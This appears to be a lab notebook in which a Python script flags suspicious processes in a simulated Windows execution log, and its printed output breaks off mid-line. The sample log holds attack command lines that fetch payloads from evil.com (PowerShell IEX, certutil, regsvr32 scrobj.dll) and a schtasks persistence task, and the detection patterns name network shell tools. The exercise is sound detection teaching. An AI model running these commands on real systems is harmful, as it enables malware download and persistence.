## **Aim**
To implement a program that identifies suspicious processes from a simulated process execution log.

## **Algorithm**
**Step 1:** Import `json`, `collections.Counter`, `datetime`, and `re` libraries.

**Step 2:** Create a simulated process execution log (JSON) with fields: timestamp, PID, PPID, process name, command line, user, integrity level.

**Step 3:** Define suspicious indicators:
   - Known malicious process names (mimikatz, psexec, wmic, etc.)
   - Unusual parent-child relationships (e.g., Word spawning PowerShell)
   - Processes running from temp directories
   - Command line anomalies (encoded commands, obfuscation)
   - High privilege processes spawned by low privilege parents
   - Living-off-the-land binaries (LOLBins) with suspicious args

**Step 4:** Parse the log and score each process based on indicators.

**Step 5:** Group by process tree to identify attack chains.

**Step 6:** Generate a report of suspicious processes with risk scores.

In [1]:
import json
import os
from datetime import datetime, timedelta
from collections import defaultdict, Counter
import re

SUSPICIOUS_PROC_NAMES = {
    'mimikatz.exe', 'psexec.exe', 'psexesvc.exe', 'wmiexec.py', 'smbexec.py',
    'secretsdump.py', 'lsassy.exe', 'gsecdump.exe', 'cachedump.exe',
    'procdump.exe', 'sqldumper.exe', 'comsvcs.dll', 'rundll32.exe',
    'regsvr32.exe', 'mshta.exe', 'cscript.exe', 'wscript.exe',
    'certutil.exe', 'bitsadmin.exe', 'schtasks.exe', 'at.exe',
    'wmic.exe', 'powershell.exe', 'pwsh.exe', 'cmd.exe'
}

LOLBINS = {
    'msbuild.exe', 'installutil.exe', 'regasm.exe', 'regsvcs.exe',
    'mshta.exe', 'rundll32.exe', 'regsvr32.exe', 'cscript.exe',
    'wscript.exe', 'certutil.exe', 'bitsadmin.exe', 'schtasks.exe',
    'wmic.exe', 'msiexec.exe', 'appinstaller.exe', 'cmstp.exe',
    'infdefaultinstall.exe', 'pcwrun.exe', 'presentationhost.exe',
    'syncappvpublishingserver.exe', 'mshta.exe', 'ieexec.exe'
}

SUSPICIOUS_PATHS = [
    r'C:\\Users\\.*\\AppData\\Local\\Temp',
    r'C:\\Windows\\Temp',
    r'C:\\Temp',
    r'/tmp',
    r'/var/tmp',
    r'C:\\ProgramData',
    r'C:\\Users\\Public'
]

SUSPICIOUS_CMD_PATTERNS = [
    (r'-enc\s+[A-Za-z0-9+/=]{50,}', 'Base64 encoded command'),
    (r'-e\s+[A-Za-z0-9+/=]{50,}', 'Base64 encoded command (short)'),
    (r'Invoke-Expression|IEX', 'PowerShell Invoke-Expression'),
    (r'DownloadString|DownloadFile', 'PowerShell download'),
    (r'New-Object\s+System\.Net\.WebClient', 'WebClient download'),
    (r'Invoke-Mimikatz', 'Mimikatz invocation'),
    (r'bypass|unrestricted', 'Execution policy bypass'),
    (r'Hidden|WindowStyle\s+Hidden', 'Hidden window'),
    (r'NoProfile|NonInteractive', 'Non-interactive mode'),
    (r'FromBase64String|Convert.*Base64', 'Base64 decoding'),
    (r'[;&|]\s*(wget|curl|nc|ncat)\s', 'Network tool in command'),
]

EXPECTED_PARENTS = {
    'winword.exe': ['explorer.exe', 'winword.exe'],
    'excel.exe': ['explorer.exe', 'excel.exe'],
    'outlook.exe': ['explorer.exe', 'outlook.exe'],
    'powershell.exe': ['explorer.exe', 'cmd.exe', 'powershell.exe', 'powershell_ise.exe'],
    'cmd.exe': ['explorer.exe', 'cmd.exe', 'powershell.exe'],
    'wmic.exe': ['cmd.exe', 'powershell.exe', 'wmiprvse.exe'],
    'rundll32.exe': ['explorer.exe', 'services.exe'],
    'regsvr32.exe': ['explorer.exe', 'cmd.exe'],
    'mshta.exe': ['explorer.exe', 'iexplore.exe'],
    'certutil.exe': ['cmd.exe', 'powershell.exe'],
}

def create_sample_process_log(log_file):
    now = datetime.now()
    base = now - timedelta(hours=2)
    
    events = [
        # Normal user activity
        {"timestamp": (base + timedelta(minutes=5)).isoformat(), "pid": 1234, "ppid": 4321, "name": "explorer.exe", "cmdline": "C:\\Windows\\explorer.exe", "user": "user", "integrity": "Medium"},
        {"timestamp": (base + timedelta(minutes=6)).isoformat(), "pid": 2345, "ppid": 1234, "name": "winword.exe", "cmdline": '"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"', "user": "user", "integrity": "Medium"},
        {"timestamp": (base + timedelta(minutes=10)).isoformat(), "pid": 3456, "ppid": 1234, "name": "chrome.exe", "cmdline": '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"', "user": "user", "integrity": "Medium"},
        {"timestamp": (base + timedelta(minutes=15)).isoformat(), "pid": 4567, "ppid": 1234, "name": "code.exe", "cmdline": '"C:\\Users\\user\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe"', "user": "user", "integrity": "Medium"},
        
        # Suspicious: Word spawning PowerShell (macro malware)
        {"timestamp": (base + timedelta(minutes=20)).isoformat(), "pid": 5678, "ppid": 2345, "name": "powershell.exe", "cmdline": 'powershell.exe -enc SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHogAC0ARAB1AG0AHQB5AHIAZQBzAHQAYQByAHQ', "user": "user", "integrity": "Medium"},
        
        # Suspicious: PowerShell downloading and executing
        {"timestamp": (base + timedelta(minutes=21)).isoformat(), "pid": 6789, "ppid": 5678, "name": "powershell.exe", "cmdline": 'powershell.exe -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://evil.com/payload.ps1\')"', "user": "user", "integrity": "Medium"},
        
        # Suspicious: certutil downloading
        {"timestamp": (base + timedelta(minutes=22)).isoformat(), "pid": 7890, "ppid": 6789, "name": "certutil.exe", "cmdline": 'certutil.exe -urlcache -split -f http://evil.com/malware.exe C:\\Temp\\malware.exe', "user": "user", "integrity": "Medium"},
        
        # Suspicious: malware execution from temp
        {"timestamp": (base + timedelta(minutes=23)).isoformat(), "pid": 8901, "ppid": 7890, "name": "malware.exe", "cmdline": 'C:\\Temp\\malware.exe', "user": "user", "integrity": "Medium"},
        
        # LOLBin: msbuild executing code
        {"timestamp": (base + timedelta(minutes=30)).isoformat(), "pid": 9012, "ppid": 1234, "name": "msbuild.exe", "cmdline": 'msbuild.exe C:\\Temp\\build.xml /t:MaliciousTarget', "user": "user", "integrity": "Medium"},
        
        # Normal system processes
        {"timestamp": (base + timedelta(minutes=35)).isoformat(), "pid": 4321, "ppid": 0, "name": "System", "cmdline": "", "user": "SYSTEM", "integrity": "System"},
        {"timestamp": (base + timedelta(minutes=35)).isoformat(), "pid": 5432, "ppid": 4321, "name": "smss.exe", "cmdline": "", "user": "SYSTEM", "integrity": "System"},
        {"timestamp": (base + timedelta(minutes=35)).isoformat(), "pid": 6543, "ppid": 4321, "name": "csrss.exe", "cmdline": "", "user": "SYSTEM", "integrity": "System"},
        {"timestamp": (base + timedelta(minutes=35)).isoformat(), "pid": 7654, "ppid": 4321, "name": "wininit.exe", "cmdline": "", "user": "SYSTEM", "integrity": "System"},
        {"timestamp": (base + timedelta(minutes=35)).isoformat(), "pid": 8765, "ppid": 4321, "name": "services.exe", "cmdline": "", "user": "SYSTEM", "integrity": "System"},
        {"timestamp": (base + timedelta(minutes=35)).isoformat(), "pid": 9876, "ppid": 8765, "name": "lsass.exe", "cmdline": "", "user": "SYSTEM", "integrity": "System"},
        {"timestamp": (base + timedelta(minutes=35)).isoformat(), "pid": 1098, "ppid": 8765, "name": "svchost.exe", "cmdline": "", "user": "SYSTEM", "integrity": "System"},
        
        # Suspicious: wmiprvse spawning cmd (lateral movement)
        {"timestamp": (base + timedelta(minutes=40)).isoformat(), "pid": 2098, "ppid": 1098, "name": "wmiprvse.exe", "cmdline": "", "user": "SYSTEM", "integrity": "System"},
        {"timestamp": (base + timedelta(minutes=41)).isoformat(), "pid": 3098, "ppid": 2098, "name": "cmd.exe", "cmdline": 'cmd.exe /c whoami', "user": "SYSTEM", "integrity": "System"},
        {"timestamp": (base + timedelta(minutes=42)).isoformat(), "pid": 4098, "ppid": 3098, "name": "whoami.exe", "cmdline": 'whoami.exe', "user": "SYSTEM", "integrity": "System"},
        
        # Suspicious: schtasks creating persistence
        {"timestamp": (base + timedelta(minutes=45)).isoformat(), "pid": 5098, "ppid": 5678, "name": "schtasks.exe", "cmdline": 'schtasks.exe /create /tn "Windows Update" /tr "C:\\Temp\\malware.exe" /sc onlogon /ru SYSTEM', "user": "user", "integrity": "High"},
        
        # Suspicious: regsvr32 with scrobj.dll (Squiblydoo)
        {"timestamp": (base + timedelta(minutes=50)).isoformat(), "pid": 6098, "ppid": 5678, "name": "regsvr32.exe", "cmdline": 'regsvr32.exe /s /n /u /i:http://evil.com/payload.sct scrobj.dll', "user": "user", "integrity": "Medium"},
    ]
    
    with open(log_file, "w") as f:
        json.dump(events, f, indent=2)

def analyze_processes(events):
    # Build process tree
    proc_map = {e["pid"]: e for e in events}
    children = defaultdict(list)
    for e in events:
        children[e["ppid"]].append(e["pid"])
    
    results = []
    
    for e in events:
        score = 0
        indicators = []
        
        name_lower = e["name"].lower()
        cmdline_lower = e["cmdline"].lower() if e["cmdline"] else ""
        
        # Check suspicious process name
        if name_lower in SUSPICIOUS_PROC_NAMES:
            score += 10
            indicators.append(f"Suspicious process name: {e['name']}")
        
        # Check LOLBin
        if name_lower in LOLBINS:
            score += 5
            indicators.append(f"LOLBin detected: {e['name']}")
        
        # Check suspicious path
        for path_pattern in SUSPICIOUS_PATHS:
            if re.search(path_pattern, cmdline_lower, re.IGNORECASE):
                score += 15
                indicators.append(f"Execution from suspicious path: {path_pattern}")
                break
        
        # Check command line patterns
        for pattern, desc in SUSPICIOUS_CMD_PATTERNS:
            if re.search(pattern, cmdline_lower, re.IGNORECASE):
                score += 20
                indicators.append(f"Suspicious command pattern: {desc}")
        
        # Check parent-child anomaly
        parent = proc_map.get(e["ppid"])
        if parent:
            parent_name = parent["name"].lower()
            expected = EXPECTED_PARENTS.get(name_lower, [])
            if expected and parent_name not in [p.lower() for p in expected]:
                score += 15
                indicators.append(f"Unusual parent: {parent['name']} -> {e['name']}")
        
        # Check integrity level escalation
        if parent and parent["integrity"] == "Medium" and e["integrity"] in ("High", "System"):
            score += 20
            indicators.append(f"Integrity escalation: {parent['integrity']} -> {e['integrity']}")
        
        # Check for living off the land with suspicious args
        if name_lower in LOLBINS and any(kw in cmdline_lower for kw in ['http', 'download', 'invoke', 'bypass', 'encoded']):
            score += 25
            indicators.append("LOLBin with network/invoke indicators")
        
        # Determine risk
        if score >= 50:
            risk = "CRITICAL"
        elif score >= 30:
            risk = "HIGH"
        elif score >= 15:
            risk = "MEDIUM"
        elif score > 0:
            risk = "LOW"
        else:
            risk = "SAFE"
        
        if score > 0:
            results.append({
                "pid": e["pid"],
                "ppid": e["ppid"],
                "name": e["name"],
                "cmdline": e["cmdline"][:100] if e["cmdline"] else "",
                "user": e["user"],
                "integrity": e["integrity"],
                "score": score,
                "risk": risk,
                "indicators": indicators
            })
    
    return sorted(results, key=lambda x: -x["score"])

def build_process_tree(events, suspicious_pids):
    proc_map = {e["pid"]: e for e in events}
    suspicious_set = set(suspicious_pids)
    
    # Find root suspicious processes (those whose ancestors aren't suspicious)
    roots = []
    for pid in suspicious_set:
        current = proc_map.get(pid)
        is_root = True
        while current and current["ppid"] != 0:
            if current["ppid"] in suspicious_set:
                is_root = False
                break
            current = proc_map.get(current["ppid"])
        if is_root:
            roots.append(pid)
    
    return roots

def print_tree(events, pid, indent=0, proc_map=None, max_depth=5):
    if indent > max_depth:
        return
    proc_map = proc_map or {e["pid"]: e for e in events}
    e = proc_map.get(pid)
    if not e:
        return
    prefix = "  " * indent
    print(f"{prefix}└─ PID {e['pid']} (PPID {e['ppid']}) {e['name']} [{e['user']}]")
    if e["cmdline"]:
        print(f"{prefix}    CMD: {e['cmdline'][:80]}")
    for child_pid in [c for c in proc_map if proc_map[c]["ppid"] == pid]:
        print_tree(events, child_pid, indent + 1, proc_map, max_depth)

def main():
    log_file = "process_execution_log.json"
    create_sample_process_log(log_file)
    
    with open(log_file, "r") as f:
        events = json.load(f)
    
    print("Analyzing process execution log...")
    suspicious = analyze_processes(events)
    
    print(f"\n{'='*60}")
    print(f"SUSPICIOUS PROCESS ANALYSIS")
    print(f"{'='*60}")
    print(f"Total processes: {len(events)}")
    print(f"Suspicious processes: {len(suspicious)}")
    
    if not suspicious:
        print("\nNo suspicious processes detected.")
        return
    
    print(f"\n--- SUSPICIOUS PROCESSES (by risk score) ---")
    for i, s in enumerate(suspicious, 1):
        print(f"\n{i}. [{s['risk']}] PID {s['pid']} - {s['name']} (Score: {s['score']})")
        print(f"    PPID: {s['ppid']} | User: {s['user']} | Integrity: {s['integrity']}")
        print(f"    CMD: {s['cmdline']}")
        for ind in s['indicators']:
            print(f"    ⚠ {ind}")
    
    # Show process tree for attack chain
    print(f"\n--- ATTACK CHAIN (Process Tree) ---")
    suspicious_pids = [s["pid"] for s in suspicious]
    roots = build_process_tree(events, suspicious_pids)
    proc_map = {e["pid"]: e for e in events}
    
    for root_pid in roots:
        print_tree(events, root_pid, proc_map=proc_map)
    
    # Summary by risk
    risk_counts = Counter(s["risk"] for s in suspicious)
    print(f"\n--- RISK SUMMARY ---")
    for risk in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
        if risk in risk_counts:
            print(f"  {risk}: {risk_counts[risk]}")

if __name__ == "__main__":
    main()

Analyzing process execution log...

SUSPICIOUS PROCESS ANALYSIS
Total processes: 21
Suspicious processes: 8

--- SUSPICIOUS PROCESSES (by risk score) ---

1. [CRITICAL] PID 6789 - powershell.exe (Score: 70)
    PPID: 5678 | User: user | Integrity: Medium
    CMD: powershell.exe -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.
    ⚠ Suspicious process name: powershell.exe
    ⚠ Suspicious command pattern: PowerShell Invoke-Expression
    ⚠ Suspicious command pattern: PowerShell download
    ⚠ Suspicious command pattern: Hidden window

2. [CRITICAL] PID 7890 - certutil.exe (Score: 55)
    PPID: 6789 | User: user | Integrity: Medium
    CMD: certutil.exe -urlcache -split -f http://evil.com/malware.exe C:\Temp\malware.exe
    ⚠ Suspicious process name: certutil.exe
    ⚠ LOLBin detected: certutil.exe
    ⚠ Execution from suspicious path: C:\\Temp
    ⚠ LOLBin with network/invoke indicators

3. [CRITICAL] PID 6098 - regsvr32.exe (Score: 55)
    PPID: 567

## **Result**
This the program successfully identifies suspicious processes from a simulated process execution log.